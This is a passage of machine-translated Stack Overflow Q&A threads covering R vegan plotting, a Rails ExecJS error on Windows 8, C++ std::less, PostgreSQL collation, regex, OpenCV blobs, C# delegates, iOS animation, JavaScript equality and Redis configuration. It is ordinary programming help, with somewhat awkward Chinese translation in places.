data(dune)
data(dune.env)

# RDA
RDA <- rda(dune ~ A1, data = dune.env)

# extract species scores
df <- data.frame(spec_scores = scores(RDA)$species[ , 1], 
                 taxa = rownames(scores(RDA)$species))
df <- df[abs(df$spec_scores) > 0.05, ]

# plot
par(mar = c(5,4,4,8))
# boxplot of sites-scores along A1-axis
boxplot(scores(RDA)$sites[ , 1] ~ dune.env$Management)
abline(h = 0, lty = "dotted")

# add species scores to plot
rug(df$spec_scores, side=4)
linestack(df$spec_scores, labels=df$taxa, at = par("usr")[2], add = TRUE, hoff = 1) 
```

![在此处输入图像描述](../Images/60639c5ed81e31a94a41c81b50263c00.png)

基本上我正在寻找一种如何在箱线图下方绘制标记地毯的方法。

有什么提示或建议吗？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-01-22T13:12:14.323

这是仅使用的解决方案`ggplot2`，因此它不是最优雅的解决方案。

我按照@Eric Fail 的建议开始了第一步。

```
require(vegan)
data(dune)
data(dune.env)

# RDA
RDA <- rda(dune ~ A1, data = dune.env)

# extract species scores
df1 <- data.frame(RDA.scores = scores(RDA)$sites[ , 1], Management = dune.env$Management)
df2 <- data.frame(y = scores(RDA)$species[ , 1], taxa = rownames(scores(RDA)$species))
# Order data according to species scores
df2<-df2[order(df2$y),]

# define values for rugs (segments). 4.9 and 5.0 used because data has 4 levels (+1)
df2$x=4.9
df2$xend=5

# define coordinates for names (30 is number of species)
df2$yend2<-seq(min(df1$RDA.scores),max(df1$RDA.scores),length.out=30)
df2$xend2=5.3

# plot
P <- ggplot(data = df1, aes( x = Management, y = RDA.scores) ) + 
     geom_segment(y=0,yend=0,x=0,xend=5, lty=2, size = I(0.3)) + 
     geom_boxplot() + 
     #add extra levels to get space
     scale_x_discrete(limits=c("BF", "HF", "NM", "SF", "","")) + 
     #set y scale
     scale_y_continuous(limits=c(-3,5),expand=c(0,0)) +
     #add rugs as segments and add segments connecting rugs and texts
     geom_segment(data= df2, mapping=aes(x=x,xend=xend,y=y,yend=y), size = I(0.3)) +
     geom_segment(data= df2, mapping=aes(x=xend,xend=xend2,y=y,yend=yend2), size = I(0.4)) +
     #add texts
     geom_text(data=df2,mapping=aes(x=xend2+0.1,y=yend2,label=taxa),hjust=0, size=3) +
     #add rectangular to imitate box around plot
     geom_rect(xmax=5,xmin=0.4,ymax=5,ymin=-3,colour="black",fill=NA)

# Final adjustments of plot
P+theme(axis.line=element_blank(),
        panel.grid=element_blank(),
        panel.background=element_blank()) 
```

![ggplot2 箱线图](../Images/875716247b7477abd6265c3371e5f917.png)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-22T09:24:07.473

我已经开始研究解决方案，但我有点卡住了。我发布它是希望铁杆数据可视化的人可以为真正的解决方案做出贡献（如果这不是这样做的方法，请告诉我，我将删除这个半生不熟的项目）。

```
# data
require(vegan)
data(dune)
data(dune.env)

# RDA
RDA <- rda(dune ~ A1, data = dune.env)

# extract species scores
df1 <- data.frame(RDA.scores = scores(RDA)$sites[ , 1], Management = dune.env$Management)
df2 <- data.frame(spec_scores = scores(RDA)$species[ , 1], taxa = rownames(scores(RDA)$species))
df2 <- df2[abs(df2$spec_scores) > 0.05, ]
df2 <- cbind(df2, x = rep(1:4, 6))

# plot
P <- ggplot(data = df1, aes( x = Management, y = RDA.scores) ) + geom_boxplot() + theme_bw()  +geom_hline(y=0, lty=2) + geom_rug(data= df2, mapping=aes(x = x , y = spec_scores), sides="r") + geom_text(data= df2, mapping=aes(x=5, y=spec_scores, label=taxa), size=2) + xlim(c("BF", "HF", "NM", "SF", ""))
P 
```

![半生不熟的项目情节](../Images/a116fa9d9016c119620a1d3c8a86bc6f.png)

# ruby-on-rails - 用户#index (RoR) 中的 ExecJS::RuntimeError

> ID：13530042
> 
> 赞同：31
> 
> 时间：2012-11-23T13:23:53.007
> 
> 标签：ruby-on-rails, windows-8

只需运行“生成脚手架用户...”命令。

然后我去`localhost:3000/users/`看看这个：

```
 ExecJS::RuntimeError in Users#index

Showing C:/Users/TheOnlyUser/Desktop/NMS/nms2/app/views/layouts/application.html.erb where line #6 raised:

  (in C:/Users/TheOnlyUser/Desktop/NMS/nms2/app/assets/javascripts/ads.js.coffee)

Extracted source (around line #6):

3: <head>
4:   <title>Nms2</title>
5:   <%= stylesheet_link_tag    "application", :media => "all" %>
6:   <%= javascript_include_tag "application" %>
7:   <%= csrf_meta_tags %>
8: </head>
9: <body>

Rails.root: C:/Users/TheOnlyUser/Desktop/NMS/nms2
Application Trace | Framework Trace | Full Trace

app/views/layouts/application.html.erb:6:in `_app_views_layouts_application_html_erb___753556572_43068540'
app/controllers/users_controller.rb:7:in `index'
... 
```

这一切意味着什么？

更新：

那是在 Windows 8 上。Windows 7 不会给出这些错误。

* * *

## 回答 #1

> 赞同：83
> 
> 时间：2013-01-02T08:55:37.137

几个月前，我的朋友在尝试关于 Win 8 RTM 的 Rails 教程并遇到了这个错误。不确定 Windows 7 中是否也存在此问题，但这可能会有所帮助。

**选项：**

**1）删除 `//= require_tree .`/忽略问题-**这条线不应该首先引起问题。ExecJS 与您系统上的 JavaScript 运行时正常工作存在实际问题，删除此行只是忽略了这一事实。

**2) 安装 Node.js / 逃跑 -** 许多人似乎只是最终安装 Node.js 并使用它，而不是他们系统上已经存在的 JavaScript 运行时。虽然这是一个有效的选项，但它还需要额外的软件，并且只能避免最初的问题，即 ExecJS 无法与系统上已有的 JavaScript 运行时一起正常工作。如果您系统上现有的 JavaScript 运行时应该工作，为什么不让它工作而不是安装更多软件呢？根据 ExecJS 创建者的说法，Windows 中已经内置的运行时实际上是受支持的......

> ExecJS 允许您从 Ruby 运行 JavaScript 代码。它会自动选择可用于评估 JavaScript 程序的最佳运行时，然后将结果作为 Ruby 对象返回给您。
> 
> ExecJS 支持这些运行时：
> 
> *   therubyracer - 嵌入在 Ruby 中的 Google V8
> *   therubyrhino - 嵌入在 JRuby 中的 Mozilla Rhino
> *   节点.js
> *   Apple JavaScriptCore - 包含在 Mac OS X 中
> *   **Microsoft Windows 脚本宿主 (JScript)**
> 
> （来自[github.com/sstephenson/execjs#execjs](http://github.com/sstephenson/execjs#execjs)）

**3) 实际解决问题/学习 -**使用选项 1 和 2 的知识来寻找其他解决方案。在实际找到有关我们遇到的根本问题的信息之前，我无法告诉您在看到选项 1 或 2 时关闭了多少网页是公认的解决方案。我们一直在寻找的唯一原因是我们无法相信 Rails 团队会 (1) 在每个脚手架生成的导致问题的项目中插入一行代码，或者 (2) 要求我们安装额外的软件来运行该默认值行代码。因此，我们最终解决了我们的根本问题（您的里程可能会有所不同）。

**对我们有用的修复：** 在有问题的系统上，找到 ExecJS 的**runtimes.rb**文件。看起来像[这样](https://github.com/sstephenson/execjs/blob/master/lib/execjs/runtimes.rb)。复制找到的文件以进行备份。打开原始 runtimes.rb 进行编辑。找到以行开头的部分`JScript = ExternalRuntime.new(`。在该部分中，包含`:command => "cscript //E:jscript //Nologo //U",`- 删除`//U`唯一的行。然后在包含的行上`:encoding => 'UTF-16LE' # CScript with //U returns UTF-16LE`- 将 UTF-16LE 更改为`UTF-8`. 保存对文件的更改。文件的这一部分现在应该是：

```
JScript = ExternalRuntime.new(
    :name        => "JScript",
    :command     => "cscript //E:jscript //Nologo",
    :runner_path => ExecJS.root + "/support/jscript_runner.js",
    :encoding    => 'UTF-8' # CScript with //U returns UTF-16LE
) 
```

接下来，停止然后重新启动 Rails 服务器并在浏览器中刷新产生原始错误的页面。希望页面现在加载没有错误。这是我们最初发布结果的 ExecJS 问题线程：[https ://github.com/sstephenson/execjs/issues/81#issuecomment-9892952](https://github.com/sstephenson/execjs/issues/81#issuecomment-9892952)

如果这不能解决问题，您总是可以用您（希望）制作的备份副本覆盖修改后的 runtimes.rb，一切都会回到原点。在这种情况下，请考虑选项 3 并继续搜索。让我们知道最终对您有用的东西.. 除非它删除了 require_tree 或安装 node.js，否则已经有很多这样的事情发生了。:)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-23T15:31:58.743

就像评论者说的那样，你可能错过了一颗宝石。尝试将以下内容添加到您的 gemfile 中：

```
gem 'therubyracer' 
```

并运行`bundle install`

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-08-20T00:04:14.250

我最初选择了 Kevin P 上面的解决方案 3，并且在我的 Windows 8 机器上一切正常。

昨晚（2013 年 8 月 19 日）更新 MS 后，我什至无法在我的 rails 应用程序中呈现主页。

我安装了 node.js 并且它工作正常，所以我现在使用解决方案 2。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-12-20T14:03:24.807

编辑 runtimes.rb 解决了 Win 8.1 上的问题

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-07-03T16:03:32.110

解决问题的最快方法是安装 Node.js。Ruby 会自动检测它，你不会再有 JS 运行时错误

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-11-01T05:11:03.077

runtimes.rb 文件

```
 JScript = ExternalRuntime.new(
        :name        => "JScript",
        :command     => "cscript //E:jscript //Nologo",
        :runner_path => ExecJS.root + "/support/jscript_runner.js",
        :encoding    => 'UTF-8' # CScript with //U returns UTF-16LE
    ) 
```

在 Windows 8.1 中工作

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-12-31T21:18:02.133

我遇到了同样的问题，Kevin P 的解决方案 3 为我工作（编辑 runtimes.rb 文件）。
我在应用解决方案时的设置如下：
**操作系统：** Windows 8.1
**Ruby 版本：** 1.9.3p484
**Rails 版本：** 3.2.14

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2014-07-06T00:50:56.457

我解决此问题的最快方法是：

宝石'therubyracer'，'0.12.1'

捆绑更新

捆绑安装

我希望这将有所帮助。

# c++ - 如何在包含类的向量中使用 std::less

> ID：13530043
> 
> 赞同：0
> 
> 时间：2012-11-23T13:23:57.030
> 
> 标签：c++

如何在包含类的向量中使用 std::less，所有谷歌结果都带有纯 int 示例。

谈到课程，例如：

```
class A{
   public:
      A( int value = 0 ):m_value(value){};
      int m_value;
}; 
```

如何执行以下操作：

`std::count_if( m_cells.begin(), m_cells.end(), std::less< int >() );`

Less 将收到 A，而不是 int。`std::less< A >`

似乎 less 需要一个仿函数`operator()()`，如何避免这种情况？我需要实现 operator<( int a ) 吗？做个绑定？还有什么？

代码：

```
 1 #include <iostream>
  2 #include <vector>
  3 #include <algorithm>
  4
  5 using namespace std;
  6
  7 class A
  8 {
  9    public:
 10       A(int a = 0 ):m_value(a) {}
 11       bool operator!=( int a )
 12       {
 13          return m_value != a;
 14       }
 15
 16       bool operator<( A &a )
 17       {
 18          return m_value < a.m_value;
 19       }
 20
 21       int m_value;
 22 };
 23
 24
 25 int main(){
 26    std::vector< A > m_cells( 5 );
 27
 28    m_cells[2].m_value = 3;
 29    m_cells[3].m_value = 4;
 30    m_cells[4].m_value = 4;
 31    std::count_if( m_cells.begin(), m_cells.end(), std::less< A >() );
 32    return 0;
 33 }
 34 
```

这导致：

```
/usr/lib/gcc/x86_64-redhat-linux/4.4.6/../../../../include/c++/4.4.6/bits/stl_algo.h:4437: error: no match for call to ‘(std::less<A>) (A&)’
/usr/lib/gcc/x86_64-redhat-linux/4.4.6/../../../../include/c++/4.4.6/bits/stl_function.h:229: note: candidates are: bool std::less<_Tp>::operator()(const _Tp&, const _Tp&) const [with _Tp = A] 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T13:25:14.670

实现一个`operator<`for `A`，然后传入`std::less<A>`，其他选项（例如，您可以实现一个转换运算符`int`- YUCKYUCKYUCKYUCK）

编辑：继续...

就像詹姆斯说的那样，`std::less<>`需要两个参数，如果你被困在 c++03 上（并且没有提升），你可以执行以下操作：

```
std::count_if( m_cells.begin(), m_cells.end() ,std::bind1st(std::less<A>(), 3) ) 
```

基本上，其中一个参数绑定到`3`- 这是第一个参数（考虑左侧），您还可以绑定到第二个参数（右侧 - using `std::bind2nd`），具体取决于您希望谓词如何工作。

这种方法需要您正确实施`operator<`，即

```
bool operator<(A const& a) const
{
} 
```

EDIT2：对于 c++11，您可以尝试以下任何方法：

```
 std::cout << std::count_if( m_cells.begin(), m_cells.end() , [](A const& a) { return 3 < a.m_value; } ) << std::endl; // lambda
 std::cout << std::count_if( m_cells.begin(), m_cells.end() , std::bind(std::less<A>(), _1, 4) ) << std::endl; // bind second argument (rhs)
 std::cout << std::count_if( m_cells.begin(), m_cells.end() , std::bind(std::less<A>(), 3, _1) ) << std::endl; // bind first argument (lhs) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T13:36:43.143

`std::less`您需要的不仅仅是`int`. `std::count_if`使用单个参数调用谓词；`std::less` 需要两个。

还有许多其他功能对象， `std::bind2nd`可以按照这些对象进行组合。然而，找出正确的组合并非易事，而且结果既不可读又脆弱，因此我不推荐这种解决方案。如果您使用的是 C++11，则可以使用 lamba，这显然是要走的路。否则， boost::bind 非常有用；如果您不能使用 Boost，唯一合理的解决方案是编写自己的谓词对象，例如：

```
class ALessThan
{
    int myUpperLimit;
public:
    ALessThan( int upperLimit ) : myUpperLimit( upperLimit ) {}
    bool operator()( A const& object ) const
    {
        return object.m_value < myUpperLimit;
    }
}; 
```

（请注意，无论你怎么做，你都必须为谓词提供一个参数。小于什么？）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-23T13:56:14.047

问题在于您对引擎盖下使用`operator<`的定义。`std::less<>`

使用您的 current `operator<`，您实际上是在告诉编译器该运算符可能会更改其任一操作数（因为既未声明运算符也未声明其参数`const`）。由于`std::less<>`不希望`operator<`更改的操作数，您的实现是不可接受的。

要修复它，请将定义更改`operator<`为：

```
16       bool operator<( const A &a ) const
17       {
18          return m_value < a.m_value;
19       } 
```

（注意第`const`16 行的添加）。这告诉编译器你`operator<`不会改变它的任何一个操作数，使它可以被`std::less<>`.

# python - 'P 0' <'P！' 在 python 和 postgresql 中

> ID：13530048
> 
> 赞同：9
> 
> 时间：2012-11-23T13:24:17.973
> 
> 标签：python, postgresql

Python 中的脚本不起作用，我将问题简化为以下问题。

在 PostgreSQL 9.1 中，我尝试过：

```
SELECT 'P 0' < 'P! '
f 
```

在 Python 2.7.3 中：

```
>>> 'P 0' < 'P! '
True 
```

为什么`' '`不低于`'!'`PostgreSQL？怎么了？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-23T14:02:37.307

PostgreSQL 正在使用您的语言环境的排序规则进行字符串比较。Python 使用不同的语言环境（可能是“C”）进行排序。

如果不知道您的数据库`LC_COLLATE`是什么（来自`\l+`in `psql`）以及您的 Python 运行时环境是什么，很难说更多。尝试显示数据库区域设置和 shell`locale`命令的输出。

请参阅[有关 locales 的 PostgreSQL 文档](http://www.postgresql.org/docs/current/static/locale.html)。

例如比较和对比：

```
-- results may vary depending on your OS/libc
SELECT 'P 0' < 'P! ' COLLATE "C"; -- returns true
SELECT 'P 0' < 'P! ' COLLATE "en_GB"; -- returns false 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-23T13:55:46.130

您永远不能假设字符串比较规则在两种不同的语言或系统中是相同的。有无数的约定；它不像数字那样定义明确。平等是最好的定义，但即使在那里你也会发现差异（尾随空格被忽略，大小写无关等）；不相等字符串的特定顺序超出了便携式范围。

# javascript - 正则表达式排除具有特定属性的标签详细信息并仅选择特定标签

> ID：13530051
> 
> 赞同：0
> 
> 时间：2012-11-23T13:24:19.800
> 
> 标签：javascript, regex

从下面的标签中，我只想使用正则表达式选择一些没有任何“id”属性的特定标签（tagA|tagB）详细信息。

```
<span class="online"><tagA xmlns="http://www.xyz.com/xml/ja/dtd">A1</tagA><tagB id="tg1" xmlns="http://www.xyz.com/xml/ja/dtd">B1</tagB></span>
<span class="online"><tagA id="tg2" xmlns="http://www.xyz.com/xml/ja/dtd">A2</tagA><tagB xmlns="http://www.xyz.com/xml/ja/dtd">B2</tagB></span>
<tagA id="tg3" xmlns="http://www.xyz.com/xml/ja/dtd">A3</tagA>
<tagB id="tg4" xmlns="http://www.xyz.com/xml/ja/dtd">B3</tagB>
<tagC id="tg5" xmlns="http://www.xyz.com/xml/ja/dtd">C1/tagC>
<tagA xmlns="http://www.xyz.com/xml/ja/dtd">A4</tagA>
<tagB xmlns="http://www.xyz.com/xml/ja/dtd">B4</tagB>
<tagC xmlns="http://www.xyz.com/xml/ja/dtd">C2</tagC>
<tagA>A5</tagA>
<tagB>B5</tagB>
<tagC>C3</tagC>
<span class="online"><i><tagA xmlns="http://www.xyz.com/xml/ja/dtd">A6</tagA></i><b><tagB id="tg6" xmlns="http://www.xyz.com/xml/ja/dtd">B6</tagB></b></span>
<span class="online"><i><tagA id="tg7" xmlns="http://www.xyz.com/xml/ja/dtd">A7</tagA></i><b><tagB xmlns="http://www.xyz.com/xml/ja/dtd">B7</tagB></b></span> 
```

因此，我应该只获得以下详细信息：

```
<tagA xmlns="http://www.xyz.com/xml/ja/dtd">A1</tagA>
<tagB xmlns="http://www.xyz.com/xml/ja/dtd">B2</tagB>

<tagA xmlns="http://www.xyz.com/xml/ja/dtd">A4</tagA>
<tagB xmlns="http://www.xyz.com/xml/ja/dtd">B4</tagB>
<tagA>A5</tagA>
<tagB>B5</tagB>

<tagA xmlns="http://www.xyz.com/xml/ja/dtd">A6</tagA>
<tagB xmlns="http://www.xyz.com/xml/ja/dtd">B7</tagB> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T13:26:38.453

即使它是嵌套的，这个正则表达式也会匹配

```
<(?!.*?\sid=)(.*?)(\s+.*?)?>.*?</\1> 
```

`.*?`懒惰地匹配 0 到多个字符

`(?!.*?id=)`是一个否定的前瞻，检查是否有一个 id 属性，如果它不会进一步匹配

任何匹配的内容都`()`被捕获在`group`

`\1`指`first`匹配组..

[你可以在这里](http://regexpal.com/)试试

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T13:51:34.267

使用正则表达式模式

```
<(\S+)(?![^<>]*\bid=).*?<\/\1> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T11:29:34.233

这是我的做法：

```
/<(tag[A-Z]+)(?:\s+(?!id=)\w+="[^"]+")*>\w+<\/\1>/i 
```

分解它：

*   `<(tag[A-Z]+)`匹配开始标签并在组 #1 中捕获其名称

*   `(?:\s+(?!id=)\w+="[^"]+")*`在检查属性的名称不是之后，一次使用一个属性`id`

*   `>\w+</\1>`完成开始标签，然后使用内容和结束标签

您可能需要调整其中的一部分，尤其是`\w+`序列。由于对您的数据不熟悉，我把它们扔进去作为占位符。

# c++ - 带有 OpenCV 的 Blob。哪个图书馆最好？

> ID：13530054
> 
> 赞同：6
> 
> 时间：2012-11-23T13:24:23.793
> 
> 标签：c++, opencv, cvblobslib

我计划以 C++ 用户的身份开始尝试 blob，并在 OpenCV 的 cv::Mat 有一些经验。

现在的问题是，如果我应该使用哪个 blobs 库？

到目前为止，我已经看到了这些替代方案：

1.  [cvBlobs（在谷歌代码上）](http://code.google.com/p/cvblob/) ——这确实是 ac 库，与 IplImage 一起工作，所以它需要认真适应 c++。
2.  [CvBlobsLib（在 willowgarage opencv 网页上）](http://opencv.willowgarage.com/wiki/cvBlobsLib#Code%20examples) ——它看起来像一个 c++ 库，但文档非常糟糕，有很多东西无法解释，几乎没有任何代码示例。
3.  我在 OpenCV 2.4.3 库中看到了 cv::findContours、cv::moments 和 cv::drawContours。

作为专家，你有什么建议？我的紧迫问题：新的 OpenCV 不会涵盖谷歌代码上的 cvBlobs 吗？

* * *

这是有关此主题的后续问题的链接，我在其中询问[SimpleBlobDetector](https://stackoverflow.com/q/13534723/1705967)。你可能会感兴趣。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T18:16:28.803

您应该使用 OpenCV 2.4 中的[`SimpleBlobDetector`类](http://docs.opencv.org/modules/features2d/doc/common_interfaces_of_feature_detectors.html#simpleblobdetector)。您几乎可以创建一个类型的对象，`SimpleBlobDetector`然后`detect(cv::Mat input, vector<cv::KeyPoint> keypoints, cv::Mat mask)`使用 cv::Mat 图像作为输入、关键点的空向量和另一个 cv::Mat 作为图像特定区域的可选掩码来调用该函数以查找关键点在。

请注意，cv::Mat 对象已经接管了 OpenCV 早期版本中所有以前独立的图像和矩阵类的图像和矩阵存储任务。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-11-12T08:17:06.173

你应该看看新的[opencvblobslib](https://code.google.com/p/opencvblobslib/)。它具有强大的功能，例如多核支持。

# c# - “清除”委托 c# 中的所有链式方法

> ID：13530057
> 
> 赞同：0
> 
> 时间：2012-11-23T13:24:31.680
> 
> 标签：c#, .net, delegates

我有一种情况，我需要使用匿名方法语法 ( `D += delegate(...){}`)将方法链接到委托 D。但是，我需要确保在添加新方法之前删除了其他链接方法。

我知道我可以执行 D -= a、D += b 之类的操作，但由于我使用的是匿名方法，因此我不确定这是否`-=`可行（因为我没有明确的名称。）。

如果我的推理是正确的，有没有办法可以使用匿名语法删除所有链接的方法？

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T13:44:51.867

我不得不撤回我原来的答案，因为它太错误了，并且评论（在问题和我的答案下）提供了一些额外的信息。

对于事件和委托，您可以简单地分配 null（或新的侦听器）`=`以摆脱所有其他侦听器 - 但只能在定义事件/委托的同一类中。

我发现不可能通过常规方式从未在同一类中声明的事件中删除所有侦听器，但是您可以通过找到事件/委托并使用`FieldInfo.SetValue`.

这是一个较旧的 SO 问题的链接，该问题可能与您的问题有类似的限制。这个特别的答案对我有用： [https ://stackoverflow.com/a/8108103/1659828](https://stackoverflow.com/a/8108103/1659828)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T09:06:22.310

委托类型是**不可变类型**。If`D`是委托类型的一个实例，它由一个具有**一个**或多个项目的固定长度调用列表组成。

所以你不能“清除”列表。您也不能创建具有空调用列表的新实例，因为`null`引用（不是实例）用于不存在方法的情况。

示例（`MyMethod`并且`JonnysMethod`是方法组，而不是委托变量）：

```
Action D = null;   // no object, no invocation list

D += MyMethod;     // null and new Action(MyMethod) are combined; result is assigned to D
// D is an instance, invocation list length is 1
D += JonnysMethod; // two instances are combined; D is assigned to new instance; original instances are no longer referenced and will "soon" be garbage collected
// D is an instance, invocation list length is 2

D -= MyMethod;     // D is assigned to a new instance again
D -= JonnysMethod; // D is assigned to null; no new instance 
```

小心：如果`D`真的是一个事件，请小心。如果您超出了`D`定义的类/结构，`+=`并且`-=`是对事件访问器的调用。因此，在这种情况下，它们不是直接代表组合。如果您在定义 的类/结构中`D`，并且 if`D`是“类字段”事件，`D`则可以在两种意义上使用。作为委托变量（事件的“隐藏”支持字段）和事件。`+=`和的含义`-=`可以用两种方式来解释。在 C# 3 之前，它被解释为直接在支持字段上的委托组合。在 C# 4 和 C# 5 中，语义发生了变化，`+=`并且`-=`在这种情况下是对事件访问器的调用。

# objective-c - 点击带有动画的小图像加载更大的图像

> ID：13530061
> 
> 赞同：0
> 
> 时间：2012-11-23T13:24:53.853
> 
> 标签：objective-c, ios, xcode, uiimage

我试图在用户屏幕的中心加载一个大版本的图像，然后点击我视图中已经存在的一个较小版本的图像。

理想情况下，我想使用动画来执行此操作，以像垂直翻转一样获取新图像。

此外，如果有办法让背景看起来像不是前景一样变灰，那就更好了。

这是我所追求的图像，我目前正在工作，因此无法访问实际的代码/图像。

我是新用户，无法添加图片。如果你想看看我在想什么，请点击这里。 [图片](http://i46.tinypic.com/28bxtsj.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T13:35:13.987

Github 中有一个[KGmodal Example Exist](https://github.com/kgn/KGModal)希望对您有所帮助。

您必须更改内容视图并在内容视图中以编程方式添加`Imageview`（具有所需大小）。

请点击以下链接：[https ://github.com/kgn/KGModal](https://github.com/kgn/KGModal)

有关翻转图像，请参阅[教程 iphone 翻转图像。](http://www.roseindia.net/tutorial/iphone/examples/iphone-FlipImage.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T11:03:37.117

最后，我在开始时添加了较大的图像并将其 alpha 设置为 0，然后在较小的图像上添加了一个手势识别器，使较大的图像具有动画效果，并逐渐将其 alpha 更改为 1。对大图像执行相反的操作。不知道为什么我一开始就没有想到！

# javascript - 为什么一个空函数！==一个空函数？

> ID：13530066
> 
> 赞同：0
> 
> 时间：2012-11-23T13:25:28.770
> 
> 标签：javascript, function

```
var x = function() {};
var y = function() {};

alert(x === y); // is false; 
```

如果 x 都初始化为相同的值，为什么 x 不等于 y？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-23T13:36:07.660

当您在 JavaScript 中比较对象时，您是在检查它们是否是*同一个对象*，而不是它们是否是*相同的对象*。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-23T13:36:25.587

来自 MDN：

> 如果两个操作数都是对象，那么当操作数引用内存中的同一个对象时，JavaScript 会比较相等的内部引用。

显然，您的对象彼此不同，并且引用不同的内存位置。等于比较运算符检查两个操作数是否引用同一个对象，而不是它们是否是副本。

考虑这样一个事实`(new Number(1)) != (new Number(1))`，而`1 == 1`

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-23T13:36:25.780

因为它们不是同一个函数对象。比较器不查看函数体。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-23T13:46:48.687

ECMA 标准对 JavaScript 中严格相等的工作方式给出了[一些精确的规则。](http://www.ecma-international.org/ecma-262/5.1/#sec-11.9.6)基本上，正如@Quentin 所说，如果您正在比较两个对象（除了 Number、String、Boolean、null 或 undefined），只有当它们是同一个对象时才返回 true。这里情况不同。

考虑这段代码：

```
var x = function() {};
var y = function() {};
x.something = "this is x";
y.something = "this is not x";
alert(x.something === y.something); 
```

这会给`false`.

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-23T13:47:05.407

从[规范 11.9.6](http://ecma-international.org/ecma-262/5.1/#sec-11.9.6)：

***严格等式比较算法***

> 比较 x === y，其中 x 和 y 是值，产生真或假。如下进行这样的比较：
> 
> 1.如果Type(x)与Type(y)不同，返回false。
> 
> 2.如果Type(x)是Undefined，返回true。
> 
> 3.如果Type(x)为Null，返回true。
> 
> ...
> 
> **7.如果 x 和 y 引用同一个对象，则返回 true。否则，返回假。**

# redis - 如何在从属模式下在 Cloudfoundry 上配置 Redis 实例？

> ID：13530069
> 
> 赞同：0
> 
> 时间：2012-11-23T13:25:40.273
> 
> 标签：redis, cloud-foundry, spring-data

我正在尝试在 Cloudfoundry 上配置主/从复制，但我总是遇到“ERR 未知命令 'SLAVEOF'”。我使用 Jedis 作为 spring-data-reids 的底层客户端，代码如下：

```
@Configuration
@ComponentScan(basePackages = { Constants.REDIS_PACKAGE })
@Order(1)
public class KeyValueConfig {

    @Inject
    @Named("redisMasterConnectionFactory")
    private RedisConnectionFactory redisMasterConnectionFactory;

    @Inject
    @Named("redisSlaveConnectionFactory")
    private RedisConnectionFactory redisSlaveConnectionFactory;

    @Inject
    @Named("redisCacheConnectionFactory")
    private RedisConnectionFactory redisCacheConnectionFactory;

    @Bean
    public StringRedisTemplate redisMasterTemplate() {
        StringRedisTemplate stringRedisTemplate = new StringRedisTemplate(
                redisMasterConnectionFactory);
        HealthChecks.register(new RedisHealthCheck(stringRedisTemplate,
                "master"));
        return stringRedisTemplate;
    }

    @Bean
    public StringRedisTemplate redisSlaveTemplate() {
        StringRedisTemplate stringRedisTemplate = new StringRedisTemplate(
                redisSlaveConnectionFactory);
        HealthChecks
                .register(new RedisHealthCheck(stringRedisTemplate, "slave"));
        return stringRedisTemplate;
    }

    @Bean
    public StringRedisTemplate redisCacheTemplate() {
        StringRedisTemplate stringRedisTemplate = new StringRedisTemplate(
                redisCacheConnectionFactory);
        HealthChecks
                .register(new RedisHealthCheck(stringRedisTemplate, "cache"));
        return stringRedisTemplate;
    }

    /**
     * Properties to support the local and test mode of operation.
     */
    @Configuration
    @Profile({ Profiles.LOCAL, Profiles.PROD, Profiles.TEST })
    static class Default implements MasterSlaveConfig {

        @Inject
        private Environment environment;

        @Bean
        public RedisConnectionFactory redisMasterConnectionFactory() {
            JedisConnectionFactory redis = new JedisConnectionFactory();
            redis.setHostName(environment.getProperty("redis.master.hostname"));
            redis.setPort(environment.getProperty("redis.master.port",
                    Integer.class));
            redis.setPassword(environment.getProperty("redis.master.password"));
            redis.setUsePool(true);
            return redis;
        }

        @Bean
        public RedisConnectionFactory redisSlaveConnectionFactory() {
            JedisConnectionFactory redis = new JedisConnectionFactory();
            redis.setHostName(environment.getProperty("redis.slave.hostname"));
            redis.setPort(environment.getProperty("redis.slave.port",
                    Integer.class));
            redis.setPassword(environment.getProperty("redis.slave.password"));
            redis.setUsePool(true);
            return redis;
        }

        @Bean
        public RedisConnectionFactory redisCacheConnectionFactory()
                throws Exception {
            JedisConnectionFactory redis = new JedisConnectionFactory();
            redis.setHostName(environment.getProperty("redis.cache.hostname"));
            redis.setPort(environment.getProperty("redis.cache.port",
                    Integer.class));
            redis.setPassword(environment.getProperty("redis.cache.password"));
            redis.setUsePool(true);
            return redis;
        }
    }

    /**
     * Properties to support the cloud mode of operation.
     */
    @Configuration
    @Profile(Profiles.CLOUDFOUNDRY)
    static class Cloud implements MasterSlaveConfig {

        @Bean
        public RedisConnectionFactory redisMasterConnectionFactory()
                throws Exception {
            CloudPoolConfiguration cloudPoolConfiguration = new CloudPoolConfiguration();
            cloudPoolConfiguration.setPoolSize("3-5");

            CloudRedisConnectionFactoryBean factory = new CloudRedisConnectionFactoryBean();
            factory.setCloudPoolConfiguration(cloudPoolConfiguration);
            factory.setServiceName("redis-master");
            factory.afterPropertiesSet();

            return factory.getObject();
        }

        @Bean
        public RedisConnectionFactory redisSlaveConnectionFactory()
                throws Exception {
